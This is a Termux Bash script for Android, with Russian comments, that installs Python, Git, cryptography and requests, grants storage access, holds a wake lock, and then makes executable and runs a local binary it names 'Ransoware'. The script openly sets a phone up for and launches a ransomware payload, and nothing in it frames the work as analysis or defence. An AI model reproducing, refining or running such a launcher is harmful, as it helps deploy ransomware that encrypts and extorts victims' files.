#!/data/data/com.termux/files/usr/bin/bash

# Цвета
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'

# Функции вывода
echo_info() { echo -e "${BLUE}[*]${NC} $1"; }
echo_success() { echo -e "${GREEN}[+]${NC} $1"; }
echo_error() { echo -e "${RED}[-]${NC} $1"; }
echo_warning() { echo -e "${YELLOW}[!]${NC} $1"; }

echo_info "Начало установки Ransoware..."

# 1. Запрос разрешения на хранилище
echo_info "Запрос разрешения для termux"
termux-setup-storage

# 2. Предотвращение сна
echo_info "Предотвращение сна устройства..."
termux-wake-lock

# 3. Обновление системы
echo_info "Обновление пакетов Termux..."
pkg update -y && pkg upgrade -y
if [ $? -eq 0 ]; then
    echo_success "Система обновлена"
else
    echo_error "Ошибка обновления"
    exit 1
fi

# 4. Установка зависимостей
echo_info "Установка Python и Git..."
pkg install python git -y
if [ $? -eq 0 ]; then
    echo_success "Python и Git установлены"
else
    echo_error "Ошибка установки Python/Git"
    exit 1
fi

# 5. Установка cryptography
echo_info "Установка python-cryptography..."
pkg install python-cryptography -y
if [ $? -ne 0 ]; then
    echo_warning "Пробую установить через pip..."
    pip install cryptography
    if [ $? -ne 0 ]; then
        echo_error "Не удалось установить cryptography"
        exit 1
    fi
fi
echo_success "cryptography установлен"

# 6. Установка requests
echo_info "Установка requests..."
pip install requests
if [ $? -eq 0 ]; then
    echo_success "requests установлен"
else
    echo_error "Ошибка установки requests"
    exit 1
fi

# 7. Проверяем, есть ли бинарный файл Ransoware
echo_info "Поиск бинарного файла Ransoware..."
if [ -f "Ransoware" ]; then
    echo_success "Бинарный файл найден"
    
    # 8. Даем права на выполнение
    echo_info "Установка прав на выполнение..."
    chmod +x Ransoware
    
    if [ $? -eq 0 ]; then
        echo_success "Права установлены"
        
        # 9. Запуск
        echo_success "Запуск Ransoware..."
        echo "========================================"
        ./Ransoware
    else
        echo_error "Ошибка установки прав"
        exit 1
    fi
else
    echo_error "Бинарный файл Ransoware не найден!"
    echo_warning "Убедитесь, что файл Ransoware находится в этой директории"
    echo_warning "Текущая директория: $(pwd)"
    echo_warning "Содержимое директории:"
    ls -la
    exit 1
fi